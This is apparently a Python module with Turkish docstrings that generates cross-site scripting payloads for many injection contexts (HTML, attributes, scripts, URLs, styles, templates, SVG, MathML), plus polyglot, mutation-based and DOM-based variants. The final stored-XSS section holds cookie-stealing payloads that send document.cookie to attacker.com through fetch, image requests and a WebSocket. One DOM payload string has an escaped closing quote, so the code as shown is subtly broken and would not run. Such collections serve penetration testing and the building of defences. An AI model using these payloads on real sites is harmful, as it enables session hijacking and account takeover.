"""
XSS payload generator module
"""
from typing import List, Dict, Optional
from dataclasses import dataclass
from enum import Enum

class XSSType(Enum):
    """XSS türleri"""
    REFLECTED = "Reflected"
    STORED = "Stored"
    DOM = "DOM"
    TEMPLATE = "Template"
    MUTATION = "Mutation"
    POLYGLOT = "Polyglot"

class XSSContext(Enum):
    """XSS bağlamları"""
    HTML = "HTML"
    ATTRIBUTE = "Attribute"
    SCRIPT = "Script"
    URL = "URL"
    STYLE = "Style"
    TEMPLATE = "Template"
    SVG = "SVG"
    MATHML = "MathML"

@dataclass
class XSSPayload:
    """XSS payload veri sınıfı"""
    value: str
    xss_type: XSSType
    context: XSSContext
    description: str
    success_indicators: Optional[List[str]] = None
    waf_bypass: bool = False

class PayloadGenerator:
    """XSS payload üreteci"""
    
    @staticmethod
    def get_html_payloads() -> List[XSSPayload]:
        """HTML bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='<img src=x onerror=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Basic img onerror payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<svg onload=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="SVG onload payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<audio src=x onerror=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Audio onerror payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<video src=x onerror=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Video onerror payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<body onload=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Body onload payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<details open ontoggle=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Details ontoggle payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<marquee onstart=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.HTML,
                description="Marquee onstart payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_attribute_payloads() -> List[XSSPayload]:
        """Öznitelik bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='" onmouseover="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Basic onmouseover payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='" onfocus="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Onfocus payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='" onmouseenter="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Onmouseenter payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='" onclick="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Onclick payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='" ondblclick="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Ondblclick payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='" oncontextmenu="alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.ATTRIBUTE,
                description="Oncontextmenu payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_script_payloads() -> List[XSSPayload]:
        """Script bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='";alert(1);//',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SCRIPT,
                description="Basic script payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value="';alert(1);//",
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SCRIPT,
                description="Single quote script payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='`+alert(1)+`',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SCRIPT,
                description="Template literal payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='</script><script>alert(1)</script>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SCRIPT,
                description="Script tag break payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='"-alert(1)-"',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SCRIPT,
                description="Arithmetic operator payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_url_payloads() -> List[XSSPayload]:
        """URL bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='javascript:alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.URL,
                description="Basic javascript protocol payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='data:text/html,<script>alert(1)</script>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.URL,
                description="Data URL payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='vbscript:alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.URL,
                description="VBScript protocol payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='data:application/x-javascript,alert(1)',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.URL,
                description="JavaScript data URL payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_style_payloads() -> List[XSSPayload]:
        """Style bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='</style><script>alert(1)</script>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.STYLE,
                description="Style tag break payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<link rel=stylesheet href="data:,alert(1)">',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.STYLE,
                description="Link tag payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<style>@import "data:,alert(1)";</style>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.STYLE,
                description="Import payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_template_payloads() -> List[XSSPayload]:
        """Template bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='${alert(1)}',
                xss_type=XSSType.TEMPLATE,
                context=XSSContext.TEMPLATE,
                description="Basic template injection",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='{{constructor.constructor("alert(1)")()}}',
                xss_type=XSSType.TEMPLATE,
                context=XSSContext.TEMPLATE,
                description="Angular template injection",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<%= alert(1) %>',
                xss_type=XSSType.TEMPLATE,
                context=XSSContext.TEMPLATE,
                description="EJS template injection",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_svg_payloads() -> List[XSSPayload]:
        """SVG bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='<svg><script>alert(1)</script></svg>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SVG,
                description="Basic SVG script payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SVG,
                description="SVG animate payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<svg><set attributeName=onmouseover value=alert(1)>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.SVG,
                description="SVG set payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_mathml_payloads() -> List[XSSPayload]:
        """MathML bağlamı için payloadlar"""
        return [
            XSSPayload(
                value='<math><mtext><script>alert(1)</script></mtext></math>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.MATHML,
                description="Basic MathML script payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<math href=javascript:alert(1)>CLICKME</math>',
                xss_type=XSSType.REFLECTED,
                context=XSSContext.MATHML,
                description="MathML href payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_polyglot_payloads() -> List[XSSPayload]:
        """Polyglot XSS payloadları"""
        return [
            XSSPayload(
                value='javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert(1)//>',
                xss_type=XSSType.POLYGLOT,
                context=XSSContext.HTML,
                description="Universal XSS payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='jaVasCript:/*-/*`/*\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e',
                xss_type=XSSType.POLYGLOT,
                context=XSSContext.HTML,
                description="Advanced polyglot payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_mutation_payloads() -> List[XSSPayload]:
        """DOM Mutation XSS payloadları"""
        return [
            XSSPayload(
                value='<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
                xss_type=XSSType.MUTATION,
                context=XSSContext.HTML,
                description="Noscript mutation payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='<svg><animatetransform onbegin=alert(1)>',
                xss_type=XSSType.MUTATION,
                context=XSSContext.SVG,
                description="SVG animation mutation payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_dom_payloads() -> List[XSSPayload]:
        """DOM tabanlı XSS payloadları"""
        return [
            XSSPayload(
                value='#"><img src=/ onerror=alert(1)>',
                xss_type=XSSType.DOM,
                context=XSSContext.HTML,
                description="Location hash payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='javascript:alert(1)//\',
                xss_type=XSSType.DOM,
                context=XSSContext.URL,
                description="JavaScript protocol payload",
                success_indicators=["alert(1)"]
            ),
            XSSPayload(
                value='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
                xss_type=XSSType.DOM,
                context=XSSContext.URL,
                description="Data URL payload",
                success_indicators=["alert(1)"]
            )
        ]
    
    @staticmethod
    def get_stored_payloads() -> List[XSSPayload]:
        """Stored XSS payloadları"""
        return [
            XSSPayload(
                value='<img src=x onerror="fetch(\'//attacker.com/\'+document.cookie)">',
                xss_type=XSSType.STORED,
                context=XSSContext.HTML,
                description="Cookie stealing payload",
                success_indicators=["fetch"]
            ),
            XSSPayload(
                value='<script>new Image().src="//attacker.com/"+document.cookie;</script>',
                xss_type=XSSType.STORED,
                context=XSSContext.HTML,
                description="Image based cookie stealing",
                success_indicators=["Image"]
            ),
            XSSPayload(
                value='<script>new WebSocket("ws://attacker.com").send(document.cookie)</script>',
                xss_type=XSSType.STORED,
                context=XSSContext.HTML,
                description="WebSocket based cookie stealing",
                success_indicators=["WebSocket"]
            )
        ] 